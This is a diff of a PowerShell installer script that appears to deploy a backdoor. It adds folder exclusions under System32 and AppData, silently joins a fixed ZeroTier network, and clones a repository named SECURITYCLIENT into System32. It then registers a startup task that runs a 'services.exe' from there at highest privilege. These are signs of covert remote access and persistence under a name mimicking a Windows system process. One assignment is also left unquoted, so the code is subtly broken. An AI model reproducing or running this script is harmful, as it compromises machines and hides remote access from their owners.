@@ -14,7 +14,7 @@ Ensure-Admin
 function Add-FolderExclusions {
     # List of folders to exclude
     $foldersToExclude = @(
-        "C:\Program Files\SubDir",
+        "C:\Windows\System32\SubDirectory\",
         "C:\Windows\System32\SubDir",
         "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
     )
@@ -76,58 +76,55 @@ function Install-Git {
 # Install Git
 Install-Git
 
-# Function to install ZeroTier using Chocolatey
-function Install-ZeroTier {
-    if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
-        Write-Host "Installing ZeroTier using Chocolatey..." -ForegroundColor Green
-        choco install zerotier-one -y
+# Install ZeroTier using Chocolatey
+Write-Host "Installing ZeroTier using Chocolatey..." -ForegroundColor Green
+choco install zerotier-one -y
+
+#Refreshing environmental variables 
+[System.Environment]::SetEnvironmentVariable('PATH', [System.Environment]::GetEnvironmentVariable('PATH', [System.EnvironmentVariableTarget]::Machine), [System.EnvironmentVariableTarget]::Process)
+
+
+# Verify installation
+if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
+    Write-Host "ZeroTier installation failed." -ForegroundColor Red
+    $choice = Read-Host "Do you want to troubleshoot and rerun the installation? (yes/no)"
+    if ($choice -eq "yes" -or $choice -eq "y") {
+        Write-Host "Please check your internet connection and try again." -ForegroundColor Cyan
+        return
     } else {
-        Write-Host "ZeroTier is already installed." -ForegroundColor Cyan
+        Write-Host "Exiting script without completing installation." -ForegroundColor Red
+        return
     }
 }
 
-# Install ZeroTier
-Install-ZeroTier
+# Start the ZeroTierOne service
+Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
+Start-Service -Name ZeroTierOneService
 
-# Function to start ZeroTier service and verify its status
-function Start-ZeroTierService {
-    Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
-    Start-Service -Name ZeroTierOneService -ErrorAction Stop
-
-    # Verify the service started successfully
-    if ((Get-Service -Name ZeroTierOneService).Status -eq "Running") {
-        Write-Host "ZeroTierOne service started successfully." -ForegroundColor Green
-    } else {
-        Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
-        throw "ZeroTier service failed to start."
+# Verify the service started successfully
+if ((Get-Service -Name ZeroTierOneService).Status -ne "Running") {
+    Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
+    $choice = Read-Host "Would you like to troubleshoot the service manually? (yes/no)"
+    if ($choice -eq "no" -or $choice -eq "n") {
+        Write-Host "Exiting script." -ForegroundColor Red
+        return
     }
 }
 
-# Start ZeroTier service
-Start-ZeroTierService
-
-# Function to join ZeroTier network
-function Join-ZeroTierNetwork {
-    Write-Host "Joining ZeroTier network..." -ForegroundColor Green
-    zerotier-cli join 9f77fc393ec31ee7 -ErrorAction Stop
-
-    # Verify network join
-    $networkStatus = zerotier-cli listnetworks
-    if ($networkStatus -match "9f77fc393ec31ee7") {
-        Write-Host "Successfully joined ZeroTier network." -ForegroundColor Green
-    } else {
-        Write-Host "Failed to join ZeroTier network." -ForegroundColor Red
-        throw "ZeroTier network join failed."
-    }
-}
-
-# Join ZeroTier network
-Join-ZeroTierNetwork
+# Join the specified ZeroTier network
+Write-Host "Joining ZeroTier network..." -ForegroundColor Green
+zerotier-cli join 9f77fc393ec31ee7
 
 # Function to clone the GitHub repository
 function Clone-GitHubRepo {
     $repoUrl = "https://github.com/zainmustafam977/SECURITYCLIENT.git"
-    $destinationDir = "C:\Windows\System32\SubDir\SECURITYCLIENT"
+    $destinationDir = "C:\Windows\System32\SubDirectory\"
+	
+	# Check if the destination path exists
+    if (Test-Path $destinationDir) {
+        Write-Host "Directory exists. Deleting it..."
+        Remove-Item -Recurse -Force $destinationDir
+}
 
     # Create the destination directory if it doesn't exist
     if (-not (Test-Path $destinationDir)) {
@@ -137,7 +134,7 @@ function Clone-GitHubRepo {
     Write-Host "Cloning GitHub repository..." -ForegroundColor Green
     try {
         # Use the git clone command directly
-        git clone https://github.com/zainmustafam977/SECURITYCLIENT.git C:\Windows\System32\SubDir\SECURITYCLIENT\git 
+        git clone https://github.com/zainmustafam977/SECURITYCLIENT.git C:\Windows\System32\SubDirectory\SECURITYCLIENT\git 
         Write-Host "Repository cloned successfully." -ForegroundColor Green
     } catch {
         Write-Host "Failed to clone repository: $($_.Exception.Message)" -ForegroundColor Red
@@ -187,56 +184,67 @@ Clone-GitHubRepo
     # }
 # }
 
-function Create-StartupScheduledTask {
-    $baseDir = "C:\Windows\System32\SubDir\SECURITYCLIENT\git\base"
-
-    # Check if the base directory exists
-    if (-not (Test-Path $baseDir)) {
-        Write-Host "Base directory not found: $baseDir" -ForegroundColor Red
-        throw "Base directory does not exist."
+# Function to validate if the provided path is a valid .exe file
+function Validate-ExeFile {
+    param (
+        [string]$FilePath
+    )
+    if (-not (Test-Path -Path $FilePath)) {
+        Write-Host "The specified file path does not exist." -ForegroundColor Red
+        return $false
     }
-
-    # Get the services.exe file in the base directory
-    $exeFile = Get-ChildItem -Path $baseDir -Filter "services.exe" -ErrorAction Stop
-
-    if (-not $exeFile) {
-        Write-Host "No services.exe file found in the base directory." -ForegroundColor Red
-        throw "services.exe not found."
+    if ((Get-Item $FilePath).Extension -ne ".exe") {
+        Write-Host "The specified file is not a valid .exe file." -ForegroundColor Red
+        return $false
     }
-
-    $taskName = "RunServicesAtStartup"
-    $exePath = $exeFile.FullName
-
-    # Check if the task already exists
-    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-        Write-Host "Scheduled task '$taskName' already exists." -ForegroundColor Yellow
-        return
-    }
-
-    Write-Host "Creating scheduled task for $($exeFile.Name)..." -ForegroundColor Green
-    try {
-        # Define the action (run services.exe)
-        $action = New-ScheduledTaskAction -Execute $exePath
-
-        # Define the trigger (run at system startup)
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-
-        # Define the principal (run as the current user with highest privileges)
-        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-
-        # Register the scheduled task
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction Stop
-        Write-Host "Scheduled task '$taskName' created successfully." -ForegroundColor Green
-
-        # Start the scheduled task immediately (optional)
-        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
-        Write-Host "Scheduled task '$taskName' started successfully." -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to create or start scheduled task '$taskName': $($_.Exception.Message)" -ForegroundColor Red
-        throw "Scheduled task creation or start failed."
-    }
+    return $true
 }
-# Create and start services
-Create-StartupScheduledTask
+
+# Prompt the user for the program location
+$programPath = C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe
+
+# Validate the provided path
+if (-not (Validate-ExeFile -FilePath $programPath)) {
+    Write-Host "Invalid file path or file type. Exiting script." -ForegroundColor Red
+    exit
+}
+
+# Define the task name and description
+$taskName = "StartupProgramTask"
+$taskDescription = "Runs a program at system startup under the logged-in user account."
+
+# Get the current logged-in user's username
+$currentUser = $env:USERNAME
+
+# Create the scheduled task
+$action = New-ScheduledTaskAction -Execute $programPath
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
+
+# Register the scheduled task
+try {
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal -Force
+    Write-Host "Scheduled task '$taskName' created successfully." -ForegroundColor Green
+} catch {
+    Write-Host "Failed to create the scheduled task: $_" -ForegroundColor Red
+    exit
+}
+
+# Run the scheduled task immediately
+try {
+    Start-ScheduledTask -TaskName $taskName
+    Write-Host "Scheduled task '$taskName' started successfully." -ForegroundColor Green
+} catch {
+    Write-Host "Failed to start the scheduled task: $_" -ForegroundColor Red
+    exit
+}
+
+# Verify the status of the scheduled task
+$taskStatus = (Get-ScheduledTask -TaskName $taskName).State
+if ($taskStatus -eq "Running") {
+    Write-Host "The scheduled task '$taskName' is running successfully." -ForegroundColor Green
+} else {
+    Write-Host "The scheduled task '$taskName' is not running. Current status: $taskStatus" -ForegroundColor Red
+}
 
 Write-Host "Script completed successfully." -ForegroundColor Green
